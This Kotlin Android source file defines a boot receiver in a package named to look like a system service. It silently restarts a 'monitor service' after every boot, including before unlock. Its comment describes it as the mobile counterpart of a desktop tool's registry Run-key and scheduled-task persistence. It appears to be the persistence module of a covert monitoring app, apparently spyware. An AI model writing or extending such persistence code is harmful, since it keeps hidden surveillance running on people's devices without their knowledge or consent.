package com.system.service.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.system.service.core.Config

/**
 * Boot Receiver — automatically restarts the monitor service after device boot.
 * Equivalent to the desktop's registry Run key + scheduled task persistence.
 * Handles BOOT_COMPLETED, QUICKBOOT_POWERON, and LOCKED_BOOT_COMPLETED.
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val validActions = setOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_LOCKED_BOOT_COMPLETED
        )

        if (intent.action !in validActions) return

        // Only restart if previously configured
        try {
            Config.init(context)
            if (!Config.isConfigured) return

            com.system.service.core.MonitorCore.start(context)
        } catch (_: Exception) {
            // Silent failure
        }
    }
}
